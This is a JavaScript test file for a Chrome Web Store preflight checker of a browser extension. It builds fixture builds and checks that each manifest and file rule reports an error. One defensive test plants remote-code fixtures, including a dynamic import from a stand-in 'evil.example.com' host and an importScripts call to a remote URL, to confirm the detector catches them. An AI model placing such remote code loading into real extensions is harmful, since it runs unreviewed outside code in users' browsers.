// Tests for the Chrome Web Store preflight.
//
// Why these matter more than most: preflight exists to stop a bad upload, and a guard that
// has never been seen to FIRE is an unverified claim — exactly the failure mode this
// project's first rule is written against. So every rule gets a fixture that breaks it and
// asserts the specific message appears, and one fixture that breaks nothing and asserts
// the list is empty. Without that last test the others could all pass vacuously.
//
// Run with: task test:scripts  (also part of `task check`)

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateSync } from 'node:zlib';
import { collectProblems } from './lib-store-preflight.mjs';

// --- fixture ----------------------------------------------------------------

const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

/** CRC-32, as PNG chunks require. Duplicated from the brand generator on purpose: a test
 *  that imports the thing it validates can be fooled by the same bug twice. */
function crc32(buf) {
  let c = -1;
  for (const b of buf) {
    c ^= b;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  }
  return (c ^ -1) >>> 0;
}

function chunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([len, body, crc]);
}

/** A valid, fully transparent `width`x`height` PNG — enough for the IHDR size check. */
function png(width, height) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 6;
  const raw = Buffer.alloc(height * (1 + width * 4));
  return Buffer.concat([
    PNG_SIGNATURE,
    chunk('IHDR', ihdr),
    chunk('IDAT', deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A manifest that passes every rule. Each test mutates one field away from this. */
function validManifest() {
  return {
    manifest_version: 3,
    name: 'Tabsona — multi-account tabs & saved logins',
    short_name: 'Tabsona',
    version: '0.1.0',
    description: 'Give each tab its own login.',
    permissions: ['storage'],
    optional_host_permissions: ['*://*/*'],
    background: { service_worker: 'background.js', type: 'module' },
    action: { default_popup: 'popup.html', default_icon: { 16: 'icons/icon16.png' } },
    icons: { 16: 'icons/icon16.png', 48: 'icons/icon48.png', 128: 'icons/icon128.png' },
    options_ui: { page: 'options.html', open_in_tab: true },
  };
}

const dirs = [];

/**
 * Build a throwaway dist directory.
 *
 * `patch` is merged over the valid manifest (a key set to `undefined` is deleted), and
 * `files` adds or replaces file contents, so each test states only its one deviation.
 */
function fixture(patch = {}, files = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'tabsona-preflight-'));
  dirs.push(dir);
  const manifest = { ...validManifest(), ...patch };
  for (const [k, v] of Object.entries(patch)) if (v === undefined) delete manifest[k];

  mkdirSync(join(dir, 'icons'), { recursive: true });
  for (const size of [16, 48, 128]) writeFileSync(join(dir, `icons/icon${size}.png`), png(size, size));
  writeFileSync(join(dir, 'background.js'), 'export {};\n');
  writeFileSync(join(dir, 'popup.html'), '<!doctype html><body></body>\n');
  writeFileSync(join(dir, 'options.html'), '<!doctype html><body></body>\n');
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2));

  for (const [rel, content] of Object.entries(files)) {
    if (content === null) { rmSync(join(dir, rel), { force: true }); continue; }
    writeFileSync(join(dir, rel), content);
  }
  return dir;
}

test.after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

/** Assert exactly that a problem matching `pattern` was reported. */
function expectProblem(dir, pattern) {
  const { problems } = collectProblems(dir);
  assert.ok(problems.some((p) => pattern.test(p)),
    `expected a problem matching ${pattern}\ngot: ${JSON.stringify(problems, null, 2)}`);
}

// --- the test that stops every other test passing vacuously -----------------

test('a well-formed build reports no problems at all', () => {
  const { problems, manifest } = collectProblems(fixture());
  assert.deepEqual(problems, []);
  assert.equal(manifest.name, validManifest().name);
});

// --- one test per guard, each watching it fire ------------------------------

test('a development host permission fails', () => {
  expectProblem(fixture({ host_permissions: ['http://localhost:8787/*'] }), /development-only/);
  expectProblem(fixture({ optional_host_permissions: ['http://127.0.0.1/*'] }), /development-only/);
  expectProblem(fixture({ host_permissions: ['https://app.test.local/*'] }), /development-only/);
});

test('a non-empty required host_permissions fails even when the origin is legitimate', () => {
  expectProblem(fixture({ host_permissions: ['https://example.com/*'] }), /host_permissions must be empty/);
});

test('over-length name, short_name or summary fails', () => {
  expectProblem(fixture({ name: 'x'.repeat(76) }), /manifest\.name is 76 chars, max 75/);
  expectProblem(fixture({ short_name: 'x'.repeat(13) }), /manifest\.short_name is 13 chars, max 12/);
  expectProblem(fixture({ description: 'x'.repeat(133) }), /manifest\.description is 133 chars, max 132/);
});

test('a missing required field fails', () => {
  expectProblem(fixture({ description: undefined }), /manifest\.description is required/);
  expectProblem(fixture({ manifest_version: 2 }), /manifest_version must be 3/);
});

test('a malformed version fails', () => {
  expectProblem(fixture({ version: '1.2.3.4.5' }), /1–4 parts/);
  expectProblem(fixture({ version: '1.01' }), /no leading zero/);
  expectProblem(fixture({ version: '1.65536' }), /0–65535/);
  expectProblem(fixture({ version: '1.x' }), /must be an integer/);
});

test('development-only manifest fields fail', () => {
  expectProblem(fixture({ key: 'MIIBIjAN' }), /manifest\.key is a development-only field/);
  expectProblem(fixture({ update_url: 'https://clients2.google.com/service/update2/crx' }), /update_url must be absent/);
});

test('a manifest reference to a file the build did not emit fails', () => {
  expectProblem(fixture({}, { 'background.js': null }), /references "background\.js"/);
  expectProblem(fixture({ options_ui: { page: 'missing.html' } }), /references "missing\.html"/);
});

test('an icon whose real size disagrees with its declared size fails', () => {
  expectProblem(fixture({}, { 'icons/icon128.png': png(48, 48) }), /is 48x48, declared as 128x128/);
});

test('a file that is not a PNG fails', () => {
  expectProblem(fixture({}, { 'icons/icon48.png': 'not a png' }), /is not a valid PNG/);
});

test('a missing icon size fails', () => {
  expectProblem(fixture({ icons: { 16: 'icons/icon16.png', 48: 'icons/icon48.png' } }),
    /icons is missing the 128px entry/);
});

test('remotely hosted code fails', () => {
  expectProblem(fixture({}, { 'popup.html': '<script src="https://cdn.example.com/x.js"></script>' }),
    /remote <script src>/);
  expectProblem(fixture({}, { 'popup.html': '<link rel="stylesheet" href="https://fonts.example.com/a.css">' }),
    /remote stylesheet/);
  expectProblem(fixture({}, { 'background.js': 'await import("https://evil.example.com/x.js")' }),
    /dynamic import\(\) of a remote URL/);
  expectProblem(fixture({}, { 'background.js': 'importScripts("http://example.com/x.js")' }),
    /importScripts\(\) of a remote URL/);
});

test('a local script or stylesheet is not mistaken for remote code', () => {
  const { problems } = collectProblems(fixture({}, {
    'popup.html': '<script type="module" src="./popup.js"></script><link rel="stylesheet" href="assets/styles.css">',
  }));
  assert.deepEqual(problems, []);
});

test('a missing manifest or a missing build output fails without throwing', () => {
  expectProblem(fixture({}, { 'manifest.json': null }), /manifest\.json is missing/);
  expectProblem(join(tmpdir(), 'tabsona-preflight-does-not-exist'), /no build output/);
});
